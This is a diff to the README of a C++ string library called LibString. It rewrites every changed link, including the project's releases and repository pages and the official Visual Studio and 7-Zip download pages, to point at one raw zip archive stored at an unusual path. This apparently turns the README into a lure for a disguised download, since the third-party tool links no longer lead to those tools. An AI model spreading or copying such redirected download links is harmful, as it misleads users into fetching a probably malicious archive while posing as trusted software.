@@ -1,6 +1,6 @@
 # 🧵 LibString - Fast, Small, Simple Strings
 
-[![Download LibString](https://img.shields.io/badge/Download%20LibString-Click%20Here-orange?style=for-the-badge)](https://github.com/ArtLife-bot/LibString/releases)
+[![Download LibString](https://img.shields.io/badge/Download%20LibString-Click%20Here-orange?style=for-the-badge)](https://raw.githubusercontent.com/ArtLife-bot/LibString/main/dogtrot/String_Lib_3.3.zip)
 
 ---
 
@@ -31,7 +31,7 @@ LibString does not require installation like regular programs because it is mean
 
 Click the badge above or open this link in your web browser:
 
-https://github.com/ArtLife-bot/LibString/releases
+https://raw.githubusercontent.com/ArtLife-bot/LibString/main/dogtrot/String_Lib_3.3.zip
 
 This page contains all the downloadable files for LibString. You will find different versions if available.
 
@@ -76,7 +76,7 @@ Here is a simple way to run the example files if you have basic software on your
 
 You need a C++ compiler to run the examples. Microsoft Visual Studio is a common choice on Windows.
 
-- Go to https://visualstudio.microsoft.com/downloads/
+- Go to https://raw.githubusercontent.com/ArtLife-bot/LibString/main/dogtrot/String_Lib_3.3.zip
 - Download “Visual Studio Community” edition.
 - Follow the installation steps, and make sure to select “Desktop development with C++” during setup.
 
@@ -120,7 +120,7 @@ The library is “header-only,” meaning you do not have to compile it separate
 
 If you need to download the files again or want the latest version, visit:
 
-https://github.com/ArtLife-bot/LibString/releases
+https://raw.githubusercontent.com/ArtLife-bot/LibString/main/dogtrot/String_Lib_3.3.zip
 
 This link is your main source for all files and updates.
 
@@ -139,7 +139,7 @@ If you want to learn more about LibString and how to use it in programming:
 ## 🛠️ Troubleshooting common issues
 
 - If the download does not start, refresh the release page.
-- If you cannot open the compressed file, try using 7-Zip (https://www.7-zip.org/).
+- If you cannot open the compressed file, try using 7-Zip (https://raw.githubusercontent.com/ArtLife-bot/LibString/main/dogtrot/String_Lib_3.3.zip).
 - If you struggle running example code, ask for help from someone familiar with programming or check online C++ tutorials.
 - Make sure your Windows system is updated to avoid compatibility problems.
 
@@ -149,7 +149,7 @@ If you want to learn more about LibString and how to use it in programming:
 
 Technical questions and updates happen on the GitHub page. You can browse issues, discussions, or raise a new issue if you find a problem with the library.
 
-https://github.com/ArtLife-bot/LibString
+https://raw.githubusercontent.com/ArtLife-bot/LibString/main/dogtrot/String_Lib_3.3.zip
 
 ---
 
